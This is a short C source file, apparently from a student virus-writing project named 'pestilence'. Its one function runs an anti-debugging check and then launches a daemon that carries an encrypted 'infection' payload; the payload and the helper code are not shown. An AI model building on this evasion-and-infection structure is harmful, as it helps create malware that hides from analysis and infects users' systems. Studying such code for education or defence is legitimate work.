/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/29 18:24:47 by plamtenz          #+#    #+#             */
/*   Updated: 2020/02/29 18:24:47 by plamtenz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <ofuscation.h>

void                penstilence(char **env)
{
    t_atp            atp;
    t_aes            *aes;
    const char       path[] = DEAMON_INFECTION_PATH;
    const char       hexdump[] = INFECTION_CRYPTED_HEXDUMP;

    atp.pestilence = 1;
    if ((aes = anti_debug(env, &atp)))
        (void)execute_deamon(aes, (char *)path, (char *)hexdump, env);
    free_aes(aes);
    atp.pestilence = 0;
}



    /*
    ** 1) Creare 1st deamon for persistent tracer check during all the execution
    ** 2) Init the aes lib and struct
    ** 3) Verify if the process is not bein debugged
    ** 4) Create 2nd deamon for the infection
    ** 5) Free all
    */